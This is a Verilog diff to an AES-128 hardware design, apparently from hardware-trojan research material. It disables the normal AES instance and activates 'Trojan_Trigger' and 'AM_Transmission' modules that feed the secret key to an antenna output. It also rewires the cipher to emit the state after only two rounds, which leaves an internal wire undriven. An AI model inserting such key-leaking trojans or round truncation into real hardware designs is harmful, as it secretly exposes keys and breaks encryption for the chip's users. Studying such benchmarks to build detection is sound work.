@@ -12,18 +12,18 @@ module top(clk, rst, state, key, out, Capacitance);
 
     // AES core (named ports)
 	
-	
+	/*
     aes_128 AES (
         .clk  (clk),
        .state(state),
         .key  (key),
         .out  (out)
     );
+	*/
 	
 	
-	
-	//Trojan_Trigger Tj_Trigger (.rst(rst), .clk(clk), .state(state), .Tj_Trig(Tj_Trig));
-	//AM_Transmission TSC (.key(key), .clk(clk), .rst(rst), .Tj_Trig(Tj_Trig), .Antena(Antena));
+	Trojan_Trigger Tj_Trigger (.rst(rst), .clk(clk), .state(state), .Tj_Trig(Tj_Trig));
+	AM_Transmission TSC (.key(key), .clk(clk), .rst(rst), .Tj_Trig(Tj_Trig), .Antena(Antena));
 	/*
 	 always @(rst, clk)
 	 begin
@@ -103,7 +103,7 @@ module aes_128(clk, state, key, out);
 	
     one_round  r1 (.clk(clk), .state_in(s0), .key(k0b), .state_out(s1));
 	
-    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(s2));
+    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(out));
 	
     one_round  r3 (.clk(clk), .state_in(s2), .key(k2b), .state_out(s3));
 	
@@ -114,7 +114,7 @@ module aes_128(clk, state, key, out);
     one_round  r6 (.clk(clk), .state_in(s5), .key(k5b), .state_out(s6));
     one_round  r7 (.clk(clk), .state_in(s6), .key(k6b), .state_out(s7));
     one_round  r8 (.clk(clk), .state_in(s7), .key(k7b), .state_out(s8));
-    one_round  r9 (.clk(clk), .state_in(s8), .key(k8b), .state_out(out));
+    one_round  r9 (.clk(clk), .state_in(s8), .key(k8b), .state_out(s9));
 	
 
     //final_round rf (.clk(clk), .state_in(s9), .key_in(k9b), .state_out(out));
